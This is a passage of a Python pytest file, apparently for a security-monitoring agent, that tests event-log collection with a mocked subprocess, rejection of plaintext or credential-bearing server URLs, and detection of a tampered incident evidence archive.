    import agent.main as main

    buffer = Buffer(
        tmp_path
        / "buffer.db"
    )

    buffer.append(
        [],
        10,
        {
            "epoch":
                "epoch"
        },
    )

    class Result:
        stdout = json.dumps(
            {
                "Oldest":
                    100,

                "Latest":
                    200,

                "Anchor":
                    None,

                "Events":
                    [],
            }
        )

    monkeypatch.setattr(
        main.subprocess,
        "run",
        lambda *args, **kwargs:
            Result(),
    )

    collect(
        buffer
    )

    assert (
        buffer.get(
            "record_id"
        )
        == "99"
    )

    assert (
        "rollover"
        in buffer.pending()[0][
            "target"
        ]
    )

    buffer.close()


# ============================================================
# Agent transport security
# ============================================================

@pytest.mark.parametrize(
    "url",
    [
        "http://192.168.1.5:8000",

        "http://example.com",

        (
            "https://user:pass"
            "@example.com"
        ),

        (
            "https://example.com"
            "?token=secret"
        ),
    ],
)
def test_remote_plaintext_or_credential_urls_rejected(
    url,
):
    with pytest.raises(
        ValueError
    ):
        Client(
            url,
            "token",
        )


# ============================================================
# Evidence integrity
# ============================================================

def test_tampered_evidence_rejected(
    lab,
    tmp_path,
):
    client, _, _, _ = lab

    ident = send(
        lab
    )["incident_ids"][0]

    original = client.get(
        "/api/v1/incidents/"
        + ident
        + "/evidence",
        headers=AUTH,
    ).content

    path = (
        tmp_path
        / "tampered.zip"
    )

    with zipfile.ZipFile(
        io.BytesIO(
            original
        )
    ) as source, zipfile.ZipFile(
        path,
        "w",
    ) as destination:

        for name in (
            source.namelist()
        ):
            destination.writestr(
                name,

                (
                    b"[]"
                    if name
                    == "events.json"

                    else source.read(
                        name
                    )
                ),
            )

    with pytest.raises(
        ValueError
    ):
        verify(
            path
        )